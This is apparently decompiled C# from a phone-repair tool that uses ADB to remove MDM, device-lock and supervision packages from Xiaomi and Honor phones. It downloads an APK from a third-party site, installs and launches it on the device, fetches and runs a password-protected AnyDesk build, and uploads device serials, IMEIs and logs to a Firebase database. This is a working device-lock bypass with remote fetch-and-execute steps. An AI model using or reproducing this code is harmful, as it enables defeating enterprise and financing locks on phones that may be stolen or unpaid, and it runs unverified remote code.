				this.ListView1.Visible = false;
				try
				{
					this.txtOutput.Clear();
					this.txtOutput.AppendText("Operation : MDM ITAdmin" + Environment.NewLine);
					this.txtOutput.AppendText("Remove Method : Xiaomi Redmi mdm V1" + Environment.NewLine + Environment.NewLine);
					this.LeerInformacionAdbPorMarca(selectedDevice);
					this.txtOutput.AppendText(Environment.NewLine);
					List<string> crashPks = new List<string>
					{
						"com.android.vending",
						"com.google.android.gsf"
					};
					List<string> disablePkgs = new List<string>
					{
						"com.android.vending",
						"com.google.android.gsf"
					};
					List<string> uninstallPkgs = new List<string>
					{
						"com.android.providers.downloads",
						"com.android.providers.downloads.ui",
						"com.trustonic.teeservice",
						"com.android.dynsystem",
						"com.android.vending",
						"com.google.android.gms.supervision"
					};
					List<List<string>> etapasAdd = new List<List<string>>
					{
						crashPks.Select((Form1._Closure$__.$I290-0 == null) ? (Form1._Closure$__.$I290-0 = ((string p) => string.Format("shell am crash {0}", p))) : Form1._Closure$__.$I290-0).ToList<string>(),
						disablePkgs.Select((Form1._Closure$__.$I290-1 == null) ? (Form1._Closure$__.$I290-1 = ((string p) => string.Format("shell pm disable-user --user 0 {0}", p))) : Form1._Closure$__.$I290-1).ToList<string>(),
						uninstallPkgs.Select((Form1._Closure$__.$I290-2 == null) ? (Form1._Closure$__.$I290-2 = ((string p) => string.Format("shell pm uninstall --user 0 {0}", p))) : Form1._Closure$__.$I290-2).ToList<string>()
					};
					string carpetaRecursos = "C:\\Tstool\\Tools";
					bool flag2 = !Directory.Exists(carpetaRecursos);
					if (flag2)
					{
						Directory.CreateDirectory(carpetaRecursos);
					}
					string rutaPApk = Path.Combine(carpetaRecursos, "P.apk");
					try
					{
						bool flag3 = !File.Exists(rutaPApk);
						if (flag3)
						{
							this.txtOutput.AppendText("\ud83d\udd04 Descargando Recursos..." + Environment.NewLine);
							bool exito = await this.DownloadFileSimple("http://reparacionesdecelular.com/up/apk/P.apk", rutaPApk);
							if (!exito)
							{
								throw new Exception("No se pudo descargar Recursos.");
							}
							this.txtOutput.AppendText("✅ Recursos descargados..." + Environment.NewLine);
						}
					}
					catch (Exception ex)
					{
						this.txtOutput.AppendText(string.Format("❌ {0} Se canceló el proceso.", ex.Message) + Environment.NewLine);
						return;
					}
					List<string> instalarEtapa = new List<string>
					{
						string.Format("push {0} /data/local/tmp/P.apk", rutaPApk),
						"shell pm install --user 0 /data/local/tmp/P.apk",
						"shell am start -n com.aurora.store/com.aurora.store.MainActivity"
					};
					etapasAdd.Add(instalarEtapa);
					this.processRunning = false;
					await this.EjecutarEtapasAdbDesdeDiccionarioExtendido("Xiaomi Redmi mdm V1", null, this.txtOutput, etapasAdd, null, null, true, false, "", false);
					this.GuardarLog(selectedDevice, "MDM ITAdmin Xiaomi Redmi mdm V1", this.txtOutput);
					string textoPlano = this.txtOutput.Text;
					await this.GuardarLogEnFirebase(textoPlano);
				}
				finally
				{
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x06000147 RID: 327 RVA: 0x0001111C File Offset: 0x0000F31C
		private async Task mdm_honorfullv1(string selectedDevice)
		{
			string manufacturer = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", selectedDevice).ToLower().Trim();
			bool flag = Operators.CompareString(manufacturer, "honor", false) != 0;
			if (flag)
			{
				MessageBox.Show(string.Format("Abortando: sólo funciona en Honor (detectado: {0})", manufacturer));
			}
			else
			{
				bool flag2 = this.processRunning;
				if (!flag2)
				{
					this.processRunning = true;
					this.cancelRequested = false;
					this.SetAllButtonsEnabled(false, null);
					this.btnCancelarProceso.Enabled = true;
					this.VerificarEntornoSeguro();
					try
					{
						this.txtOutput.Clear();
						this.txtOutput.AppendText("Operation : MDM Honor full" + Environment.NewLine);
						this.txtOutput.AppendText("Remove Method : adb google services" + Environment.NewLine + Environment.NewLine);
						this.LeerInformacionAdbPorMarca(selectedDevice);
						this.txtOutput.AppendText(Environment.NewLine);
						List<string> uninstallPkgs = new List<string>
						{
							"com.google.android.gms.supervision",
							"com.android.ons",
							"com.google.android.overlay.devicelockcontroller",
							"com.qti.dpmserviceapp",
							"com.hihonor.securitypluginbase",
							"com.hihonor.securitypluginbase",
							"com.hihonor.ouc"
						};
						List<string> disablePkgs = new List<string>
						{
							"com.google.android.gms.supervision"
						};
						List<List<string>> etapasAdd = new List<List<string>>
						{
							uninstallPkgs.Select((Form1._Closure$__.$I291-0 == null) ? (Form1._Closure$__.$I291-0 = ((string p) => string.Format("shell pm uninstall --user 0 {0}", p))) : Form1._Closure$__.$I291-0).ToList<string>(),
							disablePkgs.Select((Form1._Closure$__.$I291-1 == null) ? (Form1._Closure$__.$I291-1 = ((string p) => string.Format("shell pm disable-user --user 0 {0}", p))) : Form1._Closure$__.$I291-1).ToList<string>()
						};
						this.processRunning = false;
						await this.EjecutarEtapasAdbDesdeDiccionarioExtendido("MDM Honor full adb google services", null, this.txtOutput, etapasAdd, null, null, true, false, "", false);
						this.GuardarLog(selectedDevice, "MDM Honor full adb google services", this.txtOutput);
						string textoPlano = this.txtOutput.Text;
						await this.GuardarLogEnFirebase(textoPlano);
					}
					finally
					{
						this.processRunning = false;
						this.btnCancelarProceso.Enabled = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
					}
				}
			}
		}

		// Token: 0x06000148 RID: 328 RVA: 0x00011168 File Offset: 0x0000F368
		public async Task EjecutarEtapasAdbDesdeDiccionarioExtendido(string nombreProceso, Dictionary<string, string> paquetesDict = null, RichTextBox richTextBoxLog = null, List<List<string>> etapasAdicionales = null, List<string> etapaPersonalizadaUnitaria = null, List<string> etapasReversibles = null, bool mostrarMensajeFinal = true, bool guardarLog = true, string rutaLogPersonalizada = "", bool clearLog = true)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				bool flag2 = clearLog && richTextBoxLog != null;
				if (flag2)
				{
					richTextBoxLog.Clear();
				}
				this.VerificarEntornoSeguro();
				StringBuilder logGlobal = new StringBuilder();
				try
				{
					string selectedDevice = "";
					this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						object selectedItem = this.cmbDevicesAdb.SelectedItem;
						selectedDevice = ((selectedItem != null) ? selectedItem.ToString() : null);
					}));
					bool flag3 = paquetesDict != null && paquetesDict.Count > 0;
					if (flag3)
					{
						this.MostrarEstadoAntesDelProceso(nombreProceso, paquetesDict, selectedDevice);
					}
					List<List<string>> etapas = this.CrearEtapas(paquetesDict, etapaPersonalizadaUnitaria, etapasAdicionales, etapasReversibles);
					bool flag4 = etapas.Count == 0;
					if (flag4)
					{
						MessageBox.Show("⚠ No se especificaron comandos ni paquetes para ejecutar.");
					}
					else
					{
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.InitializeProgressBar(etapas.Count);
							this.UpdateProgressBar();
						}));
						await Task.Run(delegate()
						{
							this.EjecutarTodasLasEtapas(etapas, selectedDevice, richTextBoxLog, logGlobal);
						});
						if (mostrarMensajeFinal && !this.cancelRequested)
						{
							RichTextBox $VB$Local_richTextBoxLog = richTextBoxLog;
							if ($VB$Local_richTextBoxLog != null)
							{
								$VB$Local_richTextBoxLog.Invoke(new VB$AnonymousDelegate_0(delegate()
								{
									richTextBoxLog.AppendText(string.Format("✅ Process : {0} - completado.", nombreProceso) + Environment.NewLine);
								}));
							}
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(string.Format("❌ Error durante el proceso '{0}': {1}", nombreProceso, ex.Message));
				}
				finally
				{
					if (guardarLog && logGlobal.Length > 0)
					{
						try
						{
							string rutaFinal = (!string.IsNullOrEmpty(rutaLogPersonalizada)) ? rutaLogPersonalizada : Path.Combine(Application.StartupPath, "Logs", string.Format("{0}_{1:yyyyMMdd_HHmmss}.txt", nombreProceso, DateAndTime.Now));
							Directory.CreateDirectory(Path.GetDirectoryName(rutaFinal));
							File.WriteAllText(rutaFinal, logGlobal.ToString());
						}
						catch (Exception logEx)
						{
							MessageBox.Show("No se pudo guardar el log: " + logEx.Message);
						}
					}
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
					this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.UpdateProgressBar();
					}));
				}
			}
		}

		// Token: 0x06000149 RID: 329 RVA: 0x000111FC File Offset: 0x0000F3FC
		private List<List<string>> CrearEtapas(Dictionary<string, string> paquetesDict, List<string> etapaPersonalizada, List<List<string>> etapasAdicionales, List<string> etapasReversibles)
		{
			List<List<string>> list = new List<List<string>>();
			bool flag = paquetesDict != null && paquetesDict.Count > 0;
			if (flag)
			{
				Dictionary<string, List<string>> dictionary = new Dictionary<string, List<string>>
				{
					{
						"clear",
						new List<string>()
					},
					{
						"kill",
						new List<string>()
					},
					{
						"inactive",
						new List<string>()
					},
					{
						"suspend",
						new List<string>()
					},
					{
						"disable",
						new List<string>()
					},
					{
						"uninstall",
						new List<string>()
					},
					{
						"crash",
						new List<string>()
					}
				};
				try
				{
					foreach (string arg in paquetesDict.Values.Distinct<string>())
					{
						dictionary["clear"].Add(string.Format("shell pm clear --user 0 {0}", arg));
						dictionary["kill"].Add(string.Format("shell am kill {0}", arg));
						dictionary["inactive"].Add(string.Format("shell am set-inactive {0}", arg));
						dictionary["suspend"].Add(string.Format("shell pm suspend {0}", arg));
						dictionary["disable"].Add(string.Format("shell pm disable-user --user 0 {0}", arg));
						dictionary["uninstall"].Add(string.Format("shell pm uninstall --user 0 {0}", arg));
						dictionary["crash"].Add(string.Format("shell am crash {0}", arg));
					}
				}
				finally
				{
					IEnumerator<string> enumerator;
					if (enumerator != null)
					{
						enumerator.Dispose();
					}
				}
				list.AddRange(dictionary.Values);
			}
			bool flag2 = etapaPersonalizada != null && etapaPersonalizada.Count > 0;
			if (flag2)
			{
				list.Add(new List<string>(etapaPersonalizada));
			}
			bool flag3 = etapasAdicionales != null && etapasAdicionales.Count > 0;
			if (flag3)
			{
				list.AddRange(etapasAdicionales);
			}
			bool flag4 = etapasReversibles != null && etapasReversibles.Count > 0;
			if (flag4)
			{
				list.Add(new List<string>(etapasReversibles));
			}
			return list;
		}

		// Token: 0x0600014A RID: 330 RVA: 0x00011438 File Offset: 0x0000F638
		private void EjecutarTodasLasEtapas(List<List<string>> etapas, string selectedDevice, RichTextBox richTextBoxLog, StringBuilder logGlobal)
		{
			Form1._Closure$__294-0 CS$<>8__locals1 = new Form1._Closure$__294-0(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Local_richTextBoxLog = richTextBoxLog;
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			int num = 0;
			checked
			{
				try
				{
					foreach (List<string> list in etapas)
					{
						bool flag = this.cancelRequested;
						if (flag)
						{
							break;
						}
						try
						{
							foreach (string text in list)
							{
								Form1._Closure$__294-1 CS$<>8__locals2 = new Form1._Closure$__294-1(CS$<>8__locals2);
								CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1;
								bool flag2 = this.cancelRequested;
								if (flag2)
								{
									break;
								}
								num++;
								string arg;
								try
								{
									string text2 = this.ExecuteAdbCommand(text, selectedDevice);
									arg = "OK";
								}
								catch (Exception ex)
								{
									string text2 = ex.Message;
									arg = "Error";
								}
								CS$<>8__locals2.$VB$Local_logLinea = string.Format("[{0:HH:mm:ss}] Command {1} → {2}", DateTime.Now, num, arg);
								logGlobal.AppendLine(CS$<>8__locals2.$VB$Local_logLinea);
								bool flag3 = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_richTextBoxLog != null;
								if (flag3)
								{
									CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_richTextBoxLog.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_richTextBoxLog.AppendText(CS$<>8__locals2.$VB$Local_logLinea + Environment.NewLine);
									}));
								}
								bool flag4 = text.StartsWith("delay:", StringComparison.OrdinalIgnoreCase);
								if (flag4)
								{
									string text3 = text.Substring(6).Trim();
									string s = text3;
									int num2 = 0;
									bool flag5 = int.TryParse(s, out num2);
									if (flag5)
									{
										Thread.Sleep(int.Parse(text3));
									}
								}
							}
						}
						finally
						{
							List<string>.Enumerator enumerator2;
							((IDisposable)enumerator2).Dispose();
						}
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
					}
				}
				finally
				{
					List<List<string>>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				stopwatch.Stop();
				CS$<>8__locals1.$VB$Local_totalLog = string.Format("Elapsed Time total: {0:F2} s", stopwatch.Elapsed.TotalSeconds);
				logGlobal.AppendLine(CS$<>8__locals1.$VB$Local_totalLog);
				RichTextBox $VB$Local_richTextBoxLog = CS$<>8__locals1.$VB$Local_richTextBoxLog;
				if ($VB$Local_richTextBoxLog != null)
				{
					$VB$Local_richTextBoxLog.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						CS$<>8__locals1.$VB$Local_richTextBoxLog.AppendText(CS$<>8__locals1.$VB$Local_totalLog + Environment.NewLine);
					}));
				}
			}
		}

		// Token: 0x0600014B RID: 331 RVA: 0x000116B0 File Offset: 0x0000F8B0
		private void GuardarLog(string selectedDevice, string logName, RichTextBox rtb)
		{
			try
			{
				string text = rtb.Text;
				string arg = this.ExecuteAdbCommand("shell getprop ro.boot.serialno", selectedDevice).Trim();
				string path = this.ExecuteAdbCommand("shell getprop ro.product.brand", selectedDevice).Trim();
				string path2 = this.ExecuteAdbCommand("shell getprop ro.product.model", selectedDevice).Trim();
				string text2 = Path.Combine(Application.StartupPath, "Logs", path, path2);
				Directory.CreateDirectory(text2);
				string arg2 = DateTime.Now.ToString("yyyyMMdd_HHmmss");
				string path3 = string.Format("{0} {1}_{2}.txt", arg, logName, arg2);
				string path4 = Path.Combine(text2, path3);
				File.WriteAllText(path4, text);
				rtb.AppendText(string.Format("{0}✅ Log...{1}", Environment.NewLine, Environment.NewLine));
			}
			catch (Exception ex)
			{
				MessageBox.Show(string.Format("No se pudo guardar el log: {0}", ex.Message));
			}
		}

		// Token: 0x0600014C RID: 332 RVA: 0x000117A8 File Offset: 0x0000F9A8
		private async Task GuardarLogEnFirebase(string textoPlano)
		{
			string uid = MySettingsProperty.Settings.FirebaseUid;
			string idToken = MySettingsProperty.Settings.FirebaseIdToken;
			bool flag = string.IsNullOrEmpty(uid) || string.IsNullOrEmpty(idToken);
			if (flag)
			{
				MessageBox.Show("❌ No hay credenciales de Firebase configuradas.");
			}
			else
			{
				string process = this.ExtraerValorDesdeTexto(textoPlano, "Process").Trim();
				string sn = this.ExtraerValorDesdeTexto(textoPlano, "SN").Trim();
				string brand = this.ExtraerValorDesdeTexto(textoPlano, "Brand").Trim();
				string codename = this.ExtraerValorDesdeTexto(textoPlano, "Codename").Trim();
				string model = this.ExtraerValorDesdeTexto(textoPlano, "Model").Trim();
				string androidVer = this.ExtraerValorDesdeTexto(textoPlano, "Android").Trim();
				string securityPatch = this.ExtraerValorDesdeTexto(textoPlano, "Security").Trim();
				string imei = this.ExtraerValorDesdeTexto(textoPlano, "IMEI").Trim();
				bool flag2 = string.IsNullOrEmpty(sn) || string.IsNullOrEmpty(model);
				if (flag2)
				{
					MessageBox.Show("❌ No se pudo obtener SN o Model desde el log.");
				}
				else
				{
					JObject logs = new JObject
					{
						{
							"process",
							process
						},
						{
							"brand",
							brand
						},
						{
							"sn",
							sn
						},
						{
							"codename",
							codename
						},
						{
							"model",
							model
						},
						{
							"android",
							androidVer
						},
						{
							"security",
							securityPatch
						},
						{
							"imei",
							imei
						},
						{
							"logFull",
							textoPlano
						},
						{
							"fecha",
							DateTime.UtcNow.ToString("s") + "Z"
						}
					};
					string url = string.Format("https://tstool-5ed2a-default-rtdb.firebaseio.com/usuarios/{0}/logs.json?auth={1}", uid, idToken);
					using (HttpClient client = new HttpClient())
					{
						StringContent content = new StringContent(logs.ToString(), Encoding.UTF8, "application/json");
						try
						{
							HttpResponseMessage resp = await client.PostAsync(url, content);
							if (!resp.IsSuccessStatusCode)
							{
								string err = await resp.Content.ReadAsStringAsync();
								MessageBox.Show(string.Format("❌ Error al crear log: {0}{1}{2}", resp.StatusCode, Environment.NewLine, err));
							}
						}
						catch (Exception ex)
						{
							this.txtOutput.AppendText(string.Format("❌ Excepción al conectar con server:{0}{1}", Environment.NewLine, ex.Message));
						}
					}
				}
			}
		}

		// Token: 0x0600014D RID: 333 RVA: 0x000117F4 File Offset: 0x0000F9F4
		private async void btnProcesoHonorItv1_Click(object sender, EventArgs e)
		{
			Form1._Closure$__297-0 CS$<>8__locals1 = new Form1._Closure$__297-0(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Me = this;
			CS$<>8__locals1.$VB$Local_devices = this.GetAdbDevices();
			bool flag = CS$<>8__locals1.$VB$Local_devices.Count == 0;
			if (flag)
			{
				MessageBox.Show("No se detectó ningún dispositivo ADB.");
			}
			else
			{
				this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Items.Clear();
					try
					{
						foreach (string item in CS$<>8__locals1.$VB$Local_devices)
						{
							CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Items.Add(item);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedIndex = 0;
				}));
				CS$<>8__locals1.$VB$Local_selectedDevice = "";
				this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					CS$<>8__locals1.$VB$Local_selectedDevice = CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedItem.ToString();
				}));
				await this.EjecutarHonorMdmV1(CS$<>8__locals1.$VB$Local_selectedDevice);
			}
		}

		// Token: 0x0600014E RID: 334 RVA: 0x0001183C File Offset: 0x0000FA3C
		private async Task EjecutarHonorMdmV1(string selectedDevice)
		{
			bool flag = this.processRunning;
			if (!flag)
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				try
				{
					this.txtOutput.Clear();
					this.txtOutput.AppendText("Operation : MDM ITAdmin" + Environment.NewLine);
					this.txtOutput.AppendText("Remove Method : Xiaomi Redmi mdm V1" + Environment.NewLine + Environment.NewLine);
					this.LeerInformacionAdbPorMarca(selectedDevice);
					this.txtOutput.AppendText(Environment.NewLine);
					List<string> uninstallPkgs = new List<string>
					{
						"com.android.providers.downloads",
						"com.android.providers.downloads.ui",
						"com.trustonic.teeservice",
						"com.android.dynsystem",
						"com.hihonor.ouc",
						"com.hihonor.systemappsupdater",
						"com.google.android.gms.supervision"
					};
					List<string> disablePkgs = new List<string>
					{
						"com.android.vending",
						"com.google.android.gsf"
					};
					List<List<string>> etapasAdd = new List<List<string>>
					{
						uninstallPkgs.Select((Form1._Closure$__.$I298-0 == null) ? (Form1._Closure$__.$I298-0 = ((string p) => string.Format("shell pm uninstall --user 0 {0}", p))) : Form1._Closure$__.$I298-0).ToList<string>(),
						disablePkgs.Select((Form1._Closure$__.$I298-1 == null) ? (Form1._Closure$__.$I298-1 = ((string p) => string.Format("shell pm disable-user --user 0 {0}", p))) : Form1._Closure$__.$I298-1).ToList<string>()
					};
					string carpetaRecursos = "C:\\Tstool\\Tools";
					bool flag2 = !Directory.Exists(carpetaRecursos);
					if (flag2)
					{
						Directory.CreateDirectory(carpetaRecursos);
					}
					string rutaPApk = Path.Combine(carpetaRecursos, "P.apk");
					try
					{
						bool flag3 = !File.Exists(rutaPApk);
						if (flag3)
						{
							this.txtOutput.AppendText("\ud83d\udd04 Descargando Recursos..." + Environment.NewLine);
							bool exito = await this.DownloadFileSimple("http://reparacionesdecelular.com/up/apk/P.apk", rutaPApk);
							if (!exito)
							{
								throw new Exception("No se pudo descargar Recursos.");
							}
							this.txtOutput.AppendText("✅ Recursos descargados..." + Environment.NewLine);
						}
					}
					catch (Exception ex)
					{
						this.txtOutput.AppendText(string.Format("❌ {0} Se canceló el proceso.", ex.Message) + Environment.NewLine);
						return;
					}
					List<string> instalarEtapa = new List<string>
					{
						string.Format("push {0} /data/local/tmp/P.apk", rutaPApk),
						"shell pm install --user 0 /data/local/tmp/P.apk",
						"shell am start -n com.aurora.store/com.aurora.store.MainActivity"
					};
					etapasAdd.Add(instalarEtapa);
					this.processRunning = false;
					await this.EjecutarEtapasAdbDesdeDiccionarioExtendido("Xiaomi Redmi mdm V1", null, this.txtOutput, etapasAdd, null, null, true, false, "", false);
					this.GuardarLog(selectedDevice, "MDM ITAdmin Xiaomi Redmi mdm V1", this.txtOutput);
					string textoPlano = this.txtOutput.Text;
					await this.GuardarLogEnFirebase(textoPlano);
				}
				finally
				{
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x0600014F RID: 335 RVA: 0x00011888 File Offset: 0x0000FA88
		private async Task EjecutarHonorX8cMdmV1(string selectedDevice)
		{
			bool flag = this.processRunning;
			if (!flag)
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				try
				{
					this.txtOutput.Clear();
					this.txtOutput.AppendText("Operation : MDM ITAdmin" + Environment.NewLine);
					this.txtOutput.AppendText("Remove Method : Xiaomi Redmi mdm V1" + Environment.NewLine + Environment.NewLine);
					this.LeerInformacionAdbPorMarca(selectedDevice);
					this.txtOutput.AppendText(Environment.NewLine);
					List<string> uninstallPkgs = new List<string>
					{
						"com.android.providers.downloads",
						"com.android.providers.downloads.ui",
						"com.android.dynsystem",
						"com.hihonor.ouc",
						"com.google.android.overlay.devicelockcontroller",
						"com.google.android.gms.supervision",
						"com.hihonor.systemappsupdater"
					};
					List<string> disablePkgs = new List<string>
					{
						"com.google.android.devicelockcontroller"
					};
					List<List<string>> etapasAdd = new List<List<string>>
					{
						uninstallPkgs.Select((Form1._Closure$__.$I299-0 == null) ? (Form1._Closure$__.$I299-0 = ((string p) => string.Format("shell pm uninstall --user 0 {0}", p))) : Form1._Closure$__.$I299-0).ToList<string>(),
						disablePkgs.Select((Form1._Closure$__.$I299-1 == null) ? (Form1._Closure$__.$I299-1 = ((string p) => string.Format("shell pm disable-user --user 0 {0}", p))) : Form1._Closure$__.$I299-1).ToList<string>()
					};
					string carpetaRecursos = "C:\\Tstool\\Tools";
					bool flag2 = !Directory.Exists(carpetaRecursos);
					if (flag2)
					{
						Directory.CreateDirectory(carpetaRecursos);
					}
					string rutaPApk = Path.Combine(carpetaRecursos, "P.apk");
					try
					{
						bool flag3 = !File.Exists(rutaPApk);
						if (flag3)
						{
							this.txtOutput.AppendText("\ud83d\udd04 Descargando Recursos..." + Environment.NewLine);
							bool exito = await this.DownloadFileSimple("http://reparacionesdecelular.com/up/apk/P.apk", rutaPApk);
							if (!exito)
							{
								throw new Exception("No se pudo descargar Recursos.");
							}
							this.txtOutput.AppendText("✅ Recursos descargados..." + Environment.NewLine);
						}
					}
					catch (Exception ex)
					{
						this.txtOutput.AppendText(string.Format("❌ {0} Se canceló el proceso.", ex.Message) + Environment.NewLine);
						return;
					}
					List<string> instalarEtapa = new List<string>
					{
						string.Format("push {0} /data/local/tmp/P.apk", rutaPApk),
						"shell pm install --user 0 /data/local/tmp/P.apk",
						"shell am start -n com.aurora.store/com.aurora.store.MainActivity"
					};
					etapasAdd.Add(instalarEtapa);
					this.processRunning = false;
					await this.EjecutarEtapasAdbDesdeDiccionarioExtendido("Xiaomi Redmi mdm V1", null, this.txtOutput, etapasAdd, null, null, true, false, "", false);
					this.GuardarLog(selectedDevice, "MDM Honor X8c Att 2025 v1", this.txtOutput);
					string textoPlano = this.txtOutput.Text;
					await this.GuardarLogEnFirebase(textoPlano);
				}
				finally
				{
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x06000150 RID: 336 RVA: 0x000118D4 File Offset: 0x0000FAD4
		private async void btnanydesk_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				try
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
					string basePath = "C:\\Users\\Public\\Libraries";
					string extractPath = Path.Combine(basePath, "Anydesk");
					string zipPath = Path.Combine(basePath, "Anydesk.7z");
					string flashExeName = "Anydesk.exe";
					string AnydeskExePath = Path.Combine(extractPath, flashExeName);
					string password = "Tstool@";
					bool flag2 = !Directory.Exists(basePath);
					if (flag2)
					{
						Directory.CreateDirectory(basePath);
					}
					this.txtOutput.AppendText("\ud83d\udd0d Verificando existencia de Anydesk..." + Environment.NewLine);
					bool flag3 = !File.Exists(AnydeskExePath);
					if (flag3)
					{
						this.txtOutput.AppendText("\ud83d\udd04 Anydesk no encontrado. Preparando recursos..." + Environment.NewLine);
						bool flag4 = !File.Exists(zipPath);
						if (flag4)
						{
							this.txtOutput.AppendText("\ud83d\udce5 Buscando recursos necesarios..." + Environment.NewLine);
							bool exito = await this.DownloadFileSimple("http://reparacionesdecelular.com/up/filesfix/Anydesk.7z", zipPath);
							if (!exito)
							{
								MessageBox.Show(string.Format("❌ Error al descargar archivo desde: {0}", zipPath));
								return;
							}
							this.txtOutput.AppendText("✅ Archivo descargado correctamente." + Environment.NewLine);
						}
						if (Directory.Exists(extractPath))
						{
							Directory.Delete(extractPath, true);
						}
						Directory.CreateDirectory(extractPath);
						if (Directory.Exists(extractPath))
						{
							Directory.Delete(extractPath, true);
						}
						Directory.CreateDirectory(extractPath);
						this.ExtractRomFileWith7Zip("Anydesk", password, extractPath);
						this.txtOutput.AppendText("✅ Extracción completada." + Environment.NewLine);
					}
					string[] posibles = Directory.GetFiles(extractPath, flashExeName, SearchOption.AllDirectories);
					if (posibles.Length == 0)
					{
						MessageBox.Show("❌ Anydesk no se extrajo correctamente.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					else
					{
						AnydeskExePath = posibles[0];
						string procName = Path.GetFileNameWithoutExtension(AnydeskExePath);
						Process[] running = Process.GetProcessesByName(procName);
						if (running.Length > 0)
						{
							this.txtOutput.AppendText("⚠️ Anydesk ya se está ejecutando. No se abrirá otra instancia." + Environment.NewLine);
						}
						else
						{
							ProcessStartInfo psi = new ProcessStartInfo
							{
								FileName = AnydeskExePath,
								WorkingDirectory = Path.GetDirectoryName(AnydeskExePath),
								UseShellExecute = true
							};
							Process.Start(psi);
							this.txtOutput.AppendText("\ud83d\ude80 Anydesk iniciado correctamente." + Environment.NewLine);
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show("❌ Error al iniciar Anydesk: " + ex.Message);
				}
				finally
				{
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x06000151 RID: 337 RVA: 0x0001191C File Offset: 0x0000FB1C
		private async void btnUsbRedirectorV2_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				try
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
					string basePath = "C:\\Users\\Public\\Libraries";
					string fileName = "usb-redirector-customer-module.exe";
					string downloadPath = Path.Combine(basePath, fileName);
					string downloadUrl = "https://www.incentivespro.com/downloads/usb-redirector-customer-module.exe";
					bool flag2 = !Directory.Exists(basePath);
					if (flag2)
					{
						Directory.CreateDirectory(basePath);
					}
					this.txtOutput.AppendText(string.Format("\ud83d\udce5 Descargando {0}...", fileName) + Environment.NewLine);
					bool descargado = await this.DownloadFileSimple(downloadUrl, downloadPath);
					if (!descargado)
					{
						MessageBox.Show(string.Format("❌ Error al descargar {0}.", fileName));
					}
					else
					{
						this.txtOutput.AppendText("✅ Descargado correctamente." + Environment.NewLine);
						this.UpdateProgressBar();
						this.txtOutput.AppendText("\ud83d\ude80 Iniciando instalador..." + Environment.NewLine);
						ProcessStartInfo psi = new ProcessStartInfo
						{
							FileName = downloadPath,
							WorkingDirectory = basePath,
							UseShellExecute = true
						};
						Process.Start(psi);
						this.txtOutput.AppendText("✅ Instalador iniciado." + Environment.NewLine);
						this.UpdateProgressBar();
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show("❌ Error durante el proceso: " + ex.Message);
				}
				finally
				{
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x06000152 RID: 338 RVA: 0x00011964 File Offset: 0x0000FB64
		private async void btnXiaomiBypassv2_Click(object sender, EventArgs e)
		{
